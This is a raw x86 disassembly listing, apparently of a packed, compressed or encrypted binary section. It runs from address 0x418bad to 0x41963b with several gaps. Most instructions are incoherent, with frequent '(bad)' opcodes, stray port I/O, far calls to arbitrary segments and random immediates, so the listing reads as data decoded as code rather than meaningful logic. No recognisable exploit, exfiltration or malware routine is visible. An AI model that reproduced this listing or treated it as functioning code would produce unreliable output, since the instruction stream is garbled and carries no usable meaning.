  418bad:	mov    cl,0x8
  418baf:	inc    ebp
  418bb0:	jbe    0x418c2f
  418bb2:	push   edi
  418bb3:	or     DWORD PTR ds:0xcdd1375d,ebp
  418bb9:	cdq    
  418bba:	lea    eax,[eax]
  418bbc:	lods   eax,DWORD PTR ds:[esi]
  418bbd:	(bad)  
  418bbe:	or     esi,DWORD PTR [ebx-0x4bfd1adb]
  418bc4:	and    eax,0x1b00aa54
  418bc9:	mov    ebx,0x50850154
  418bce:	fcmovb st,st(1)
  418bd0:	cdq    
  418bd1:	jmp    0x10d7:0xbdbb36fb
  418bd8:	repz jp 0x418c5a
  418bdb:	and    DWORD PTR [ecx+0x19],0x5b
  418bdf:	push   es
  418be0:	cmc    
  418be1:	mov    ds:0x2c0d8146,eax
  418be6:	fsubr  DWORD PTR [edi-0x1891e378]
  418bec:	adc    DWORD PTR [edi],edx
  418bee:	xor    eax,0x5d915845
  418bf3:	dec    edi
  418bf4:	mov    bl,BYTE PTR [ebx-0x3a]
  418bf7:	pop    ds
  418bf8:	arpl   WORD PTR [edi+0x17b5670a],dx
  418bfe:	push   edx
  418bff:	push   edx
  418c00:	int3   
  418c01:	sub    eax,0xb437914
  418c06:	and    al,BYTE PTR [ebp+0x5313582c]
  418c0c:	lea    edi,[ebx]
  418c0e:	imul   eax,ebx,0x687159c9
  418c14:	push   cs
  418c15:	and    edx,DWORD PTR [ecx]
  418c17:	or     DWORD PTR [esi+0x34],0xffffffa8
  418c1b:	fist   WORD PTR [ecx+0x6d2dc5c6]
  418c21:	test   BYTE PTR ds:[edx+edi*1],dl
  418c25:	popa   
  418c26:	aad    0xb0
  418c28:	pusha  
  418c29:	push   ds
  418c2a:	cdq    
  418c2b:	add    edi,esp
  418c2d:	cmp    al,0x8
  418c2f:	in     al,dx
  418c30:	xchg   BYTE PTR [ebp+0x66],dl
  418c33:	out    dx,al
  418c34:	jp     0x418c36
	...
  418c96:	sti    
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    esi,DWORD PTR [ebp+0x59d819d7]
  418ca7:	add    al,0x1
  418ca9:	add    BYTE PTR [edi],al
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [eax-0x551c88a5],dh
  418cb3:	dec    esp
  418cb4:	mov    al,ds:0x8f9cbb3d
  418cb9:	mov    ?,ebx
  418cbb:	jbe    0x418c81
  418cbd:	mov    ds:0xdeae28fc,eax
  418cc2:	xor    BYTE PTR [ebx+0x3240d9e0],bl
  418cc8:	adc    edx,ecx
  418cca:	xchg   ecx,eax
  418ccb:	mov    ch,BYTE PTR [edx]
  418ccd:	test   eax,0x6b43efec
  418cd2:	jb     0x418cb2
  418cd4:	iret   
  418cd5:	call   0x7716994d
  418cda:	icebp  
  418cdb:	pop    edx
  418cdc:	xchg   esi,eax
  418cdd:	mov    ch,0xab
  418cdf:	xchg   ebx,eax
  418ce0:	adc    eax,0x62554b2f
  418ce5:	gs jno 0x418cdd
  418ce8:	adc    DWORD PTR [eax],eax
  418cea:	mov    al,ds:0x8e8c0370
  418cef:	fidivr DWORD PTR [ecx+0x712833c7]
  418cf5:	push   edx
  418cf6:	or     BYTE PTR [eax],dl
  418cf8:	inc    eax
  418cf9:	push   esp
  418cfa:	lea    ecx,[ebx+edi*4+0xf]
  418cfe:	inc    DWORD PTR [ebx*8+0x32c2a59a]
  418d05:	int    0x50
  418d07:	(bad)  
  418d08:	imul   edi,esi,0xb63980b5
  418d0e:	xchg   esi,eax
  418d0f:	cmc    
  418d10:	xchg   esi,eax
  418d11:	push   esp
  418d12:	repz inc eax
  418d14:	das    
  418d15:	retf   
  418d16:	pop    eax
  418d17:	push   es
  418d18:	imul   esp,ecx,0x94797baa
  418d1e:	inc    ecx
  418d1f:	test   DWORD PTR [ecx-0x64],eax
  418d22:	gs cmc 
  418d24:	and    ah,BYTE PTR [edi+0x4441106f]
  418d2a:	and    eax,0x8fbc4bdc
  418d2f:	stos   BYTE PTR es:[edi],al
  418d30:	popa   
  418d31:	xchg   edx,eax
  418d32:	std    
  418d33:	in     al,0x7e
  418d35:	add    dl,bh
  418d37:	jno    0x418cfb
  418d39:	jne    0x418d78
  418d3b:	es scas al,BYTE PTR es:[edi]
  418d3d:	mov    esi,DWORD PTR [ebx+0x52]
  418d40:	ret    0xe11b
  418d43:	sahf   
  418d44:	arpl   WORD PTR [edi+0x3df3a5f8],cx
  418d4a:	jle    0x418cf1
  418d4c:	jge    0x418d64
  418d4e:	test   al,0x21
  418d50:	setl   BYTE PTR [edx]
  418d53:	(bad)  gs:[ebx-0x591895a4]
  418d5a:	xchg   ecx,eax
  418d5b:	add    DWORD PTR [ecx-0x72ea6ccd],eax
  418d61:	imul   DWORD PTR [edx+0x19371b7f]
  418d67:	cwde   
  418d68:	xchg   esp,eax
  418d69:	dec    edi
  418d6a:	mov    ah,0xb
  418d6c:	inc    ecx
  418d6d:	mov    ds:0xede268ac,al
  418d72:	pop    ds
  418d73:	outs   dx,BYTE PTR ds:[esi]
  418d74:	das    
  418d75:	rcl    DWORD PTR [ebx],cl
  418d77:	jp     0x418d92
  418d79:	pop    ss
  418d7a:	mov    ah,0x13
  418d7c:	div    BYTE PTR [ebx]
  418d7e:	stc    
  418d7f:	mov    DWORD PTR [ecx],eax
  418d81:	sbb    BYTE PTR ds:0xb4ba0d9e,dh
  418d87:	sub    bh,BYTE PTR [edi-0x3f64c20f]
  418d8d:	call   0x3c6e4664
  418d92:	dec    edx
  418d93:	(bad)
  418d96:	je     0x418dfe
  418d98:	int3   
  418d99:	addr16 daa 
  418d9b:	xchg   edx,eax
  418d9c:	adc    eax,0x4a964b95
  418da1:	retf   
  418da2:	pop    ebp
  418da3:	xchg   ebx,eax
  418da4:	push   eax
  418da5:	push   ss
  418da6:	leave  
  418da7:	mov    ds:0x7dfe9dc2,eax
  418dac:	pop    edi
  418dad:	mov    edx,0x8df05c50
  418db2:	pop    ecx
  418db3:	loope  0x418d4b
	...
  418e15:	add    BYTE PTR [esi],cl
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0xd40d5fbd
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	popf   
  418e2f:	pop    ebx
  418e30:	push   ss
  418e31:	dec    eax
  418e32:	jb     0x418dbc
  418e34:	and    eax,0x6d304571
  418e39:	xchg   esi,eax
  418e3a:	fdiv   st,st(6)
  418e3c:	loop   0x418dce
  418e3e:	mov    ds:0xa98a7435,al
  418e43:	mov    cl,0xb9
  418e45:	inc    ebx
  418e46:	adc    dl,ah
  418e48:	cmp    bh,BYTE PTR [eax-0x5e]
  418e4b:	push   cs
  418e4c:	mov    ds:0x150b7ba1,al
  418e51:	adc    al,BYTE PTR [edi+0x7f]
  418e54:	cmp    ecx,DWORD PTR [edx-0x1f]
  418e57:	pop    esp
  418e58:	les    edi,FWORD PTR [esi+edx*8-0x4f574a09]
  418e5f:	sti    
  418e60:	inc    ecx
  418e61:	sbb    eax,0xe0f1d042
  418e66:	mov    dh,dl
  418e68:	fnstenv es:[esi+0x15738dad]
  418e6f:	jae    0x418ec3
  418e71:	lock out dx,eax
  418e73:	sbb    esi,DWORD PTR [ebx]
  418e75:	in     eax,0x32
  418e77:	jmp    0xb6f7499b
  418e7c:	xor    ebp,DWORD PTR [edi-0x6d9d64ef]
  418e82:	aaa    
  418e83:	and    bh,0xa6
  418e86:	icebp  
  418e87:	ins    BYTE PTR es:[edi],dx
  418e88:	mov    esi,DWORD PTR [ebx+0x682652e6]
  418e8e:	sub    ch,BYTE PTR [ecx+0x5a59380b]
  418e94:	mov    ch,0x17
  418e96:	dec    ecx
  418e97:	stos   DWORD PTR es:[edi],eax
  418e98:	xchg   BYTE PTR [eax-0x65c049e5],bh
  418e9e:	rcr    DWORD PTR ds:0x2a533849,0xa9
  418ea5:	adc    al,0x57
  418ea7:	pop    esp
  418ea8:	and    dl,ah
  418eaa:	test   cl,dl
  418eac:	mov    esp,0xc05bf7a0
  418eb1:	mov    dh,0x48
  418eb3:	ja     0x418eca
  418eb5:	pop    edi
  418eb6:	ret    0xa763
  418eb9:	je     0x418f12
  418ebb:	cmc    
  418ebc:	cmp    eax,esi
  418ebe:	aas    
  418ebf:	(bad)  
  418ec0:	cmp    ebx,DWORD PTR [edx-0x78]
  418ec3:	fs pop edx
  418ec5:	mov    edi,0x1016b56c
  418eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ecb:	or     BYTE PTR [ecx],bl
  418ecd:	test   al,ah
  418ecf:	xor    eax,0x4dad5a4b
  418ed4:	add    DWORD PTR [ebx+0x2b7480c8],ecx
  418eda:	mov    cl,0xe0
  418edc:	data16 mov dl,al
  418edf:	pushf  
  418ee0:	inc    esp
  418ee1:	loopne 0x418f5d
  418ee3:	mov    ecx,0xcf90c121
  418ee8:	adc    edx,DWORD PTR [ecx-0x7]
  418eeb:	gs retf 
  418eed:	pop    ebp
  418eee:	pusha  
  418eef:	jae    0x418e8a
  418ef1:	mov    ah,0x7b
  418ef3:	(bad)  
  418ef4:	fldcw  WORD PTR [ebx+0x192f1081]
  418efa:	(bad)
  418efd:	ds repz aas 
  418f00:	dec    edi
  418f01:	jmp    0x418f79
  418f03:	mov    edx,0x8f2afd48
  418f08:	adc    eax,0x9043fdb1
  418f0d:	and    eax,0x4199c683
  418f12:	bound  esp,QWORD PTR [esi-0x5c]
  418f15:	xor    dh,BYTE PTR ds:0x96aa49ba
  418f1b:	mov    bl,0xf9
  418f1d:	test   BYTE PTR [ecx+0x7e],dl
  418f20:	sbb    al,0xa4
  418f22:	mov    ecx,0x70741e56
  418f27:	adc    BYTE PTR [ebx+0x2fb5fbc6],dh
  418f2d:	(bad)  
  418f2e:	lock les esi,FWORD PTR [ebx+edx*1+0xcfab2d]
	...
  418f96:	sbb    al,0x97
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp+0x627adcb2]
  418fa3:	pop    ebp
  418fa4:	outs   dx,BYTE PTR ds:[esi]
  418fa5:	and    ah,BYTE PTR [edi+0x6]
  418fa8:	add    DWORD PTR [eax],eax
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [ebx-0x27e7c9e0],dl
  418fb3:	dec    ebp
  418fb4:	xchg   esp,eax
  418fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fb6:	fs pop esp
  418fb8:	sbb    BYTE PTR [edx+0x23994d0e],0x72
  418fbf:	mov    ah,bh
  418fc1:	cmc    
  418fc2:	ret    0xb842
  418fc5:	icebp  
  418fc6:	mov    edx,0x4ea6e067
  418fcb:	push   eax
  418fcc:	out    0xfc,eax
  418fce:	imul   ebx,edi,0xcb10e645
  418fd4:	outs   dx,DWORD PTR ds:[esi]
  418fd5:	add    bh,BYTE PTR [edx]
  418fd7:	mov    bl,BYTE PTR [ebx-0xb]
  418fda:	mov    edx,0x967a4056
  418fdf:	int3   
  418fe0:	pop    edi
  418fe1:	mov    al,ch
  418fe3:	aaa    
  418fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fe5:	xor    eax,0x1d5d8f23
  418fea:	mov    ds:0x349b9993,eax
  418fef:	adc    edx,ebp
  418ff1:	ins    DWORD PTR es:[edi],dx
  418ff2:	jg     0x41903f
  418ff4:	mov    esp,0x56625aae
  418ff9:	repnz mov ds:0xaf73a59a,eax
  418fff:	push   ebx
  419000:	inc    ecx
  419001:	mov    ah,0xdd
  419003:	call   0xc17f:0x48ca9b91
  41900a:	leave  
  41900b:	dec    ebx
  41900c:	mov    ecx,0xcf29f58b
  419011:	xor    DWORD PTR [edx],edx
  419013:	js     0x418fff
  419015:	ins    DWORD PTR es:[edi],dx
  419016:	nop
  419017:	adc    al,0xdb
  419019:	call   0xcf3b:0xfaa75587
  419020:	out    dx,al
  419021:	ror    DWORD PTR [ecx+0x329902b2],0xc7
  419028:	jb     0x418fe6
  41902a:	aas    
  41902b:	xchg   esp,eax
  41902c:	pop    ecx
  41902d:	div    DWORD PTR [ecx+0x47]
  419030:	xchg   esp,eax
  419031:	or     bl,BYTE PTR [ebx-0xd840061]
  419037:	push   ecx
  419038:	xchg   edi,eax
  419039:	(bad)  
  41903a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41903b:	fmul   DWORD PTR [esi]
  41903d:	xchg   BYTE PTR [ebx+ecx*8],ch
  419040:	dec    edi
  419041:	jo     0x419081
  419043:	or     bl,BYTE PTR [ebx+0x5]
  419046:	xchg   edi,eax
  419047:	and    DWORD PTR [ecx+ecx*4],ebx
  41904a:	xor    BYTE PTR [ecx],al
  41904c:	mov    ebx,ebx
  41904e:	and    DWORD PTR [edx+eiz*2-0x1b63378f],0x1a
  419056:	cmp    bh,BYTE PTR [eax-0x53]
  419059:	test   al,0x3b
  41905b:	(bad)  
  41905c:	mov    BYTE PTR [edi+ecx*4-0x784b3539],bh
  419063:	out    0x35,eax
  419065:	jae    0x419089
  419067:	push   eax
  419068:	xor    eax,0x5af78a28
  41906d:	arpl   WORD PTR cs:[edx-0x521298db],ax
  419074:	mov    dh,al
  419076:	bound  ecx,QWORD PTR [ebx+ecx*1-0x44b7de5e]
  41907d:	xchg   ebp,eax
  41907e:	dec    ecx
  41907f:	pushf  
  419080:	in     al,dx
  419081:	dec    DWORD PTR [edi-0x6424117f]
  419087:	adc    edx,ebp
  419089:	retf   0x105c
  41908c:	xor    DWORD PTR [ebx],0x4dfb80f4
  419092:	cdq    
  419093:	or     eax,ecx
  419095:	out    dx,al
  419096:	and    edx,DWORD PTR [esp+eiz*2-0x778706d2]
  41909d:	in     al,dx
  41909e:	popa   
  41909f:	cmp    dh,BYTE PTR [edi+0x25]
  4190a2:	xor    DWORD PTR [ebx],ebp
  4190a4:	jmp    0x4190dc
  4190a6:	int    0x2b
  4190a8:	mov    cl,0x9d
  4190aa:	push   esp
  4190ab:	aad    0x35
  4190ad:	in     al,0xf9
  4190af:	cwde   
  4190b0:	imul   ebx,DWORD PTR [ebp+0x7f3bef],0x0
	...
  419113:	add    BYTE PTR [eax],al
  419115:	add    BYTE PTR [edi-0x41bd617b],ch
  41911b:	pop    ebx
  41911c:	(bad)  
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    ebx,DWORD PTR [edi+0x7a]
  419124:	xor    ch,BYTE PTR [edi]
  419126:	outs   dx,BYTE PTR ds:[esi]
  419127:	pop    es
  419128:	add    DWORD PTR [eax],eax
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    bh,al
  41912f:	shl    esp,1
  419131:	dec    edx
  419132:	rcr    DWORD PTR [edi],1
  419134:	retf   0x7927
  419137:	cld    
  419138:	sub    ebp,edx
  41913a:	add    al,0xad
  41913c:	js     0x419193
  41913e:	add    bh,BYTE PTR [eax]
  419140:	pop    ss
  419141:	xchg   esp,eax
  419142:	add    al,BYTE PTR ds:0x35b643f6
  419148:	(bad)  
  419149:	mov    ah,BYTE PTR [ebp-0x76]
  41914c:	pop    ebx
  41914d:	pop    edx
  41914f:	jl     0x41910b
  419151:	test   eax,0xaf8e6617
  419156:	sbb    ecx,DWORD PTR [ecx-0xd]
  419159:	fidiv  DWORD PTR [ebp+0x33]
  41915c:	jle    0x419121
  41915e:	call   0x448896d2
  419163:	adc    eax,0xe1165753
  419168:	xchg   ecx,eax
  419169:	(bad)  
  41916a:	mov    edx,0xe63242c1
  41916f:	inc    esp
  419170:	jg     0x41918e
  419172:	inc    edx
  419173:	pop    edx
  419174:	aaa    
  419175:	(bad)  
  419176:	(bad)  [eax-0x50d3e39c]
  41917c:	popf   
  41917d:	add    DWORD PTR [edx],ebp
  41917f:	mov    esp,0xf5483971
  419184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419185:	xor    al,0xc3
  419187:	mov    ecx,0x72f557aa
  41918c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41918d:	dec    ebp
  41918e:	push   edx
  41918f:	dec    ebp
  419190:	ucomiss xmm6,DWORD PTR [edx+0x36]
  419194:	in     eax,0x9b
  419196:	adc    edx,ebx
  419198:	xor    edx,0xffffffa9
  41919b:	xchg   BYTE PTR [ecx],ch
  41919d:	fcomp  DWORD PTR [ebx+0x50]
  4191a0:	jecxz  0x4191e2
  4191a2:	in     eax,0x84
  4191a4:	xor    al,0xd1
  4191a6:	ror    BYTE PTR [ebp+esi*8-0x478d675e],0x5d
  4191ae:	daa    
  4191af:	push   ecx
  4191b0:	dec    edx
  4191b1:	jbe    0x419179
  4191b3:	call   0x7a47:0xf037a01b
  4191ba:	add    al,0x34
  4191bc:	pop    esi
  4191bd:	pusha  
  4191be:	jmp    0xd47f:0x165221ca
  4191c5:	inc    ecx
  4191c6:	fnstenvw [esi+0x714fb776]
  4191cd:	sub    ecx,ebp
  4191cf:	rcr    ah,0xfe
  4191d2:	adc    DWORD PTR [ebx-0x70],0x5b
  4191d6:	xchg   esp,eax
  4191d7:	popf   
  4191d8:	cmp    BYTE PTR [ebx+0x4a],0xe4
  4191dc:	ins    DWORD PTR es:[edi],dx
  4191dd:	(bad)  
  4191de:	sahf   
  4191df:	xor    dl,BYTE PTR [esi-0x1368738a]
  4191e5:	pop    edx
  4191e6:	xchg   ebx,eax
  4191e7:	out    0xdd,al
  4191e9:	xor    eax,0xa2d37e9b
  4191ee:	aas    
  4191ef:	mov    al,ds:0x521bd3be
  4191f4:	je     0x4191fc
  4191f6:	lea    edi,[esi-0x5caaeacc]
  4191fc:	out    dx,eax
  4191fd:	pop    ebp
  4191fe:	and    dl,BYTE PTR [esi-0x20]
  419201:	pop    esi
  419202:	sub    DWORD PTR [ebx+0x6e9129e1],0x8fc91f43
  41920c:	mov    bh,0xc3
  41920e:	pop    es
  41920f:	call   0x84744604
  419214:	scas   al,BYTE PTR es:[edi]
  419215:	fchs   
  419217:	jne    0x4191f1
  419219:	ficom  DWORD PTR gs:[ebx-0x51]
  41921d:	sar    BYTE PTR [eax-0xe],cl
  419220:	add    BYTE PTR [ebx-0x28d602fe],dl
  419226:	and    bh,ch
  419228:	fst    DWORD PTR [eax+ebx*4-0x2f]
  41922c:	mov    DWORD PTR [edi*4+0x1de18d2d],edx
  419233:	shl    BYTE PTR [eax+eax*1+0x0],cl
	...
  419296:	mov    al,ds:0xff33bae7
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0x9a89a94f
  4192a5:	adc    esi,DWORD PTR [ebp+0x8]
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [ebp-0x7c],dl
  4192b0:	loop   0x419237
  4192b2:	mov    edx,0xab4a4c9e
  4192b7:	mov    eax,0xa027a8a4
  4192bc:	add    al,0x60
  4192be:	jmp    0x419293
  4192c0:	mov    DWORD PTR [ebx-0x45],eax
  4192c3:	sbb    al,0xd9
  4192c5:	fld    TBYTE PTR [ecx+0x111a2b56]
  4192cb:	inc    esi
  4192cc:	arpl   WORD PTR [edi-0x1b],bx
  4192cf:	mov    dl,0x86
  4192d1:	adc    DWORD PTR ds:0x11942f18,edx
  4192d7:	pop    ds
  4192d8:	mov    cl,0x85
  4192da:	pop    eax
  4192db:	or     al,0x7a
  4192dd:	push   0x3409b093
  4192e2:	fwait
  4192e3:	jns    0x4192d9
  4192e5:	sbb    ch,ah
  4192e7:	inc    edi
  4192e8:	test   BYTE PTR [eax+0x30],dh
  4192eb:	bound  esi,QWORD PTR [ebx+0x44]
  4192ee:	mov    dh,0xa2
  4192f0:	and    DWORD PTR [edi-0x2f],eax
  4192f3:	sti    
  4192f4:	adc    BYTE PTR [ebx-0x25],dh
  4192f7:	jmp    0x81a9964e
  4192fc:	pop    edi
  4192fd:	and    al,0x3e
  4192ff:	lar    edi,WORD PTR [edx+0x47883e6b]
  419306:	adc    eax,0x4ece57be
  41930b:	cmp    eax,ecx
  41930d:	xchg   ebx,eax
  41930e:	loop   0x4192c9
  419310:	aaa    
  419311:	mov    ch,0xb2
  419313:	aam    0xae
  419315:	or     al,BYTE PTR [edx-0x2e]
  419318:	icebp  
  419319:	mov    al,bh
  41931b:	dec    edi
  41931c:	jo     0x419367
  41931e:	jo     0x41931a
  419320:	test   eax,0xe9f28c47
  419325:	jnp    0x419367
  419327:	xchg   ebx,eax
  419328:	(bad)  
  419329:	jb     0x419353
  41932b:	call   0x6443:0x1f5d35cd
  419332:	nop
  419333:	(bad)  
  419334:	cmp    al,0xa
  419336:	lods   al,BYTE PTR ds:[esi]
  419337:	inc    esp
  419338:	sub    eax,0x480ca1e0
  41933d:	push   ss
  41933e:	jge    0x41935a
  419340:	jmp    0x419341
  419342:	add    al,0xd3
  419344:	lds    esi,FWORD PTR [esi+0x67]
  419347:	retf   0x4296
  41934a:	std    
  41934b:	push   ebp
  41934c:	lods   eax,DWORD PTR ds:[esi]
  41934d:	mov    dh,0x61
  41934f:	nop
  419350:	jle    0x419340
  419352:	pushf  
  419353:	sbb    al,0xea
  419355:	pop    edx
  419356:	jg     0x4193a0
  419358:	(bad)  [edx]
  41935a:	jl     0x4193cd
  41935c:	lahf   
  41935d:	rol    DWORD PTR [edx+0xc4316f9],cl
  419363:	sub    esp,esp
  419365:	pop    edx
  419366:	sub    al,BYTE PTR [ecx-0x75]
  419369:	pop    edx
  41936a:	ja     0x4192f2
  41936c:	sbb    al,0x45
  41936e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936f:	dec    esp
  419370:	mov    eax,0x18dce58a
  419375:	popa   
  419376:	or     DWORD PTR [ebp-0x5035ef1e],0x44b8da8d
  419380:	ss (bad) 
  419382:	jmp    0x41938c
  419384:	lahf   
  419385:	lock dec edi
  419387:	mov    ecx,0x358b448f
  41938c:	inc    BYTE PTR [ecx+eax*8]
  41938f:	enter  0x78a6,0xf4
  419393:	lods   eax,DWORD PTR ds:[esi]
  419394:	int    0x6
  419396:	and    esp,ebx
  419398:	imul   ecx,DWORD PTR [ecx],0x15133d8c
  41939e:	inc    eax
  41939f:	pop    ss
  4193a0:	fwait
  4193a1:	mov    al,0x9c
  4193a3:	nop
  4193a4:	lds    edx,FWORD PTR [ecx-0x6f]
  4193a7:	ret    0x1950
  4193aa:	and    esp,DWORD PTR [edi]
  4193ac:	xchg   edx,eax
  4193ad:	add    BYTE PTR [esi+edx*2],bh
  4193b0:	push   ebp
  4193b1:	xor    eax,0xf07585
	...
  419416:	cmp    eax,0xed3a6998
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8+0x339d8437]
  419425:	mov    esp,0x1097c
  41942a:	pop    es
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    ch,dl
  41942f:	mov    esp,0x5ef24971
  419434:	dec    esi
  419435:	pop    DWORD PTR [esi-0x27f35e0a]
  41943b:	mov    ebx,DWORD PTR [edi+0x46]
  41943e:	pop    edx
  41943f:	call   0x40c1505e
  419444:	add    BYTE PTR [edx+eiz*8],dl
  419447:	call   0x1e261c05
  41944c:	mov    ch,0x38
  41944e:	push   edi
  41944f:	clc    
  419450:	sti    
  419451:	icebp  
  419452:	xchg   BYTE PTR [ebp-0x3ee666e0],cl
  419458:	xchg   BYTE PTR [eax+0x53],ch
  41945b:	or     eax,0xba21512
  419460:	sahf   
  419461:	mov    esp,0x6b44df5b
  419466:	jl     0x4193e8
  419468:	inc    esp
  419469:	cmp    dh,BYTE PTR [ebp+0x3]
  41946c:	lods   al,BYTE PTR ds:[esi]
  41946d:	cmp    al,0x4e
  41946f:	and    dh,cl
  419471:	jnp    0x4194ed
  419473:	fcomp  DWORD PTR [esi-0x5d]
  419476:	(bad)  [ecx+ecx*8]
  419479:	sbb    ecx,DWORD PTR [edx+0x55d095c2]
  41947f:	adc    al,0x27
  419481:	pop    esi
  419482:	mov    edi,0x8afe2350
  419487:	bound  edx,QWORD PTR [ebx+eax*2]
  41948a:	aas    
  41948b:	fstp   st(4)
  41948d:	mov    ah,0xf2
  41948f:	outs   dx,DWORD PTR ds:[esi]
  419490:	inc    esp
  419491:	inc    esi
  419492:	ja     0x4194d0
  419494:	out    dx,eax
  419495:	inc    esi
  419496:	jb     0x41946c
  419498:	jle    0x419452
  41949a:	les    esp,FWORD PTR cs:[ebx+0x1c]
  41949e:	div    BYTE PTR [edx+0x35]
  4194a1:	aad    0x3e
  4194a3:	call   0xad3e:0xd281f9f8
  4194aa:	adc    BYTE PTR [eax+0x19f4d60],bh
  4194b0:	(bad)  
  4194b1:	lock pop ebx
  4194b3:	and    al,0x75
  4194b5:	xchg   DWORD PTR [eax+ebp*4],edx
  4194b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194b9:	ins    DWORD PTR es:[edi],dx
  4194ba:	cmp    edi,DWORD PTR [ebx+0x1f]
  4194bd:	shl    BYTE PTR [edx+0x75],cl
  4194c0:	mov    ds:0x98b8faed,al
  4194c5:	fst    DWORD PTR [edx]
  4194c7:	dec    esp
  4194c8:	pop    eax
  4194c9:	jle    0x41951d
  4194cb:	int    0x66
  4194cd:	or     al,0xc3
  4194cf:	scas   al,BYTE PTR es:[edi]
  4194d0:	ret    0xa663
  4194d3:	mov    fs,WORD PTR [edi+0x54fb99d6]
  4194d9:	dec    esi
  4194da:	sbb    eax,0x936f06d4
  4194df:	or     BYTE PTR [edi-0x22],al
  4194e2:	loope  0x419509
  4194e4:	ror    BYTE PTR ds:0xe9df72a5,cl
  4194ea:	mov    ds:0xcaf25912,al
  4194ef:	jne    0x4194de
  4194f1:	xchg   ecx,eax
  4194f2:	cmc    
  4194f3:	pop    edx
  4194f4:	push   ss
  4194f5:	leave  
  4194f6:	test   eax,0xb5400d98
  4194fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194fc:	mov    ss,WORD PTR [ebx]
  4194fe:	jge    0x4194eb
  419500:	das    
  419501:	mov    dl,0x1b
  419503:	mov    ah,0x36
  419505:	jl     0x4194d0
  419507:	cdq    
  419508:	and    ch,BYTE PTR ds:0xd5703fcd
  41950e:	arpl   WORD PTR [edx-0x5e8b7a72],di
  419514:	iret   
  419515:	call   0x88e9:0xe5d9913f
  41951c:	jmp    0x6567be21
  419521:	xchg   esp,eax
  419522:	or     esi,DWORD PTR [ecx-0x5c779630]
  419528:	xor    DWORD PTR [edi+ebp*8-0x19],edx
  41952c:	cs jo  0x4194b1
  41952f:	inc    edi
  419530:	and    esp,DWORD PTR ds:0x832ea4
	...
  419596:	scas   eax,DWORD PTR es:[edi]
  419597:	aam    0x8d
  419599:	(bad)  
  41959a:	(bad)  
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	mul    BYTE PTR [esi]
  4195a3:	and    BYTE PTR [eax],ch
  4195a5:	lahf   
  4195a6:	or     DWORD PTR [edx],0x1
  4195a9:	add    BYTE PTR [edi],al
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    ah,ah
  4195af:	dec    ebp
  4195b0:	dec    esp
  4195b1:	and    ebx,DWORD PTR [ecx+0xb0448ce]
  4195b7:	mov    edi,0xdc9b69c7
  4195bc:	lods   eax,DWORD PTR ds:[esi]
  4195bd:	jns    0x4195bf
  4195bf:	pop    es
  4195c0:	(bad)  
  4195c1:	imul   ebx,DWORD PTR [ebx],0x7d
  4195c4:	or     esi,ebx
  4195c6:	sub    ebx,DWORD PTR [ebx-0x74]
  4195c9:	pop    ecx
  4195ca:	js     0x41963c
  4195cc:	add    al,0xc9
  4195ce:	fiadd  DWORD PTR gs:[edx]
  4195d1:	push   ebx
  4195d2:	stos   DWORD PTR es:[edi],eax
  4195d3:	add    dh,BYTE PTR [esi+edx*4]
  4195d6:	sti    
  4195d7:	cdq    
  4195d8:	or     ecx,DWORD PTR [edx]
  4195da:	mov    gs,WORD PTR [eax+ebx*1]
  4195dd:	popa   
  4195de:	add    al,0x6a
  4195e0:	or     al,dh
  4195e2:	cmp    eax,0x99b2b86f
  4195e7:	retf   0x4f01
  4195ea:	push   ss
  4195eb:	mov    ebx,0x63588bff
  4195f0:	fwait
  4195f1:	dec    edi
  4195f2:	sub    al,0x6d
  4195f4:	test   bh,0x67
  4195f7:	loopne 0x41962d
  4195f9:	not    DWORD PTR [esi+0x1f9fce3f]
  4195ff:	lahf   
  419600:	std    
  419601:	jns    0x419671
  419603:	mov    ah,0xc1
  419605:	enter  0xfb27,0xef
  419609:	sbb    al,0x1c
  41960b:	pop    ebp
  41960c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41960d:	xchg   ecx,eax
  41960e:	xchg   ebx,edx
  419610:	adc    cl,BYTE PTR [esp+edx*4+0x40feea6c]
  419617:	fild   DWORD PTR [edi-0x18]
  41961a:	or     DWORD PTR [esi+0x1c],0x478ea6c
  419621:	and    BYTE PTR [eax],dh
  419623:	mov    dl,0x58
  419625:	jo     0x419619
  419627:	jecxz  0x419656
  419629:	cmp    edi,DWORD PTR [ebx]
  41962b:	fadd   DWORD PTR [esp+esi*8+0xd]
  41962f:	fs sbb eax,0x29ae6bc6
  419635:	inc    edi
  419636:	sbb    BYTE PTR [ecx],ch
  419638:	push   0x21
  41963a:	inc    edx
  41963b:	cmp    eax,0x674025
